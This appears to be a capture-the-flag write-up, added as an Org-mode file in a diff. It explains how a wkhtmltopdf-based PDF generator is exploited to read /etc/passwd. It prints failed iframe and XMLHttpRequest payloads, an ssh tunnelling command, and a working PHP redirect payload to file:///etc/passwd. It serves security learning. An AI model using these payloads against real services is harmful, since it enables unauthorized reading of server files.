@@ -1,0 +1,154 @@
+:PROPERTIES:
+:ID:       8cc78708-42bf-4db6-a342-cdcd72b59f93
+:END:
+#+TITLE: PDFy
+#+AUTHOR: AsmArtisan256
+#+DATE: 07-01-2025
+
+#+OPTIONS: html-style:nil
+#+OPTIONS: html-scripts:nil
+
+#+OPTIONS: author:nil
+#+OPTIONS: email:nil
+#+OPTIONS: date:t
+#+OPTIONS: toc:nil
+
+#+PROPERTY: header-args :eval no
+
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>
+
+#+EXPORT_FILE_NAME: pdfy
+
+#+BEGIN_EXPORT html
+<p class="spacing-64" \>
+#+END_EXPORT
+
+#+TOC: headlines 2
+
+#+BEGIN_EXPORT html
+<p class="spacing-64" \>
+#+END_EXPORT
+
+
+This website has an input box that generates a PDF from a website! We can test
+it fast just by typing https://google.com/:
+
+#+DOWNLOADED: screenshot @ 2025-01-06 21:56:47
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-06_21-56-47_screenshot.png]]
+
+Works pretty well. What if we just input some random non-existing website, like
+https://gjrioaegjio.greajgrae/ ? An interesting popup appears and disappears
+kind of fast on top of the page:
+
+
+#+DOWNLOADED: screenshot @ 2025-01-06 21:58:17
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-06_21-58-17_screenshot.png]]
+
+So this web application is just using =wkhtmltopdf= to convert websites to PDF.
+Naturally, I was curious about the types of exploits using this program and I
+found out that there are known [[https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/][file inclusion vulnerabilities]]. And oh boy,
+wasn't this extremely annoying to exploit... I first started with a simple HTML
+file with some common payloads to try and exploit this:
+
+#+BEGIN_SRC html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HTML5 Boilerplate</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+  <h1>Page Title</h1>
+
+    <!-- didnt work -->
+    <div>
+      <p>Report Heading</p>
+      <iframe src="file:///etc/passwd" height="500" width="500">
+      </iframe>
+    </div>
+
+    <!-- didnt work -->
+  <script>
+    x=new XMLHttpRequest;
+    x.onload=function(){
+    document.write(this.responseText)
+    };
+    x.open("GET","file:///etc/passwd");
+    x.send();
+  </script>
+</body>
+
+</html>
+#+END_SRC
+
+Before continuing, here's the thing... to actually make it work well, we have to
+use some tunneling service so we can expose our =localhost= service to the
+internet. So I ended using =localhost.run= to tunnel the server, be it a Python
+server or PHP server, by using the following command:
+
+#+BEGIN_SRC sh
+ssh -R 80:localhost:8000 localhost.run
+#+END_SRC
+
+And I am mentioning PHP because nothing worked with the code above. So I fired
+up a PHP server with the usual PHP code to try and read files:
+=get_file_contents("/etc/passwd")=, or even =include("/etc/passwd")=. And they
+actually worked, but the =/etc/passwd= file that was showing was *my* own file! But
+then, by scrubbing for more information, I found out that the PHP =header=
+function could be the solution, since it evaluates the file differently, and
+will actually fetch the one from the HTB server:
+
+#+BEGIN_SRC php
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>PHP Test</title>
+    </head>
+    <body>
+    <?php
+        Header("location:file:///etc/passwd");
+    ?>
+    </body>
+</html>
+#+END_SRC
+
+And /voilá/:
+
+#+DOWNLOADED: screenshot @ 2025-01-07 00:22:12
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-07_00-22-12_screenshot.png]]
+
+The flag is not shown, but it's in that exact file.
+
+
+* FOOTER                                                                                              :ignore:
+:PROPERTIES:
+:clearpage: t
+:END:
+#+BEGIN_EXPORT html
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">07-01-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+#+END_EXPORT
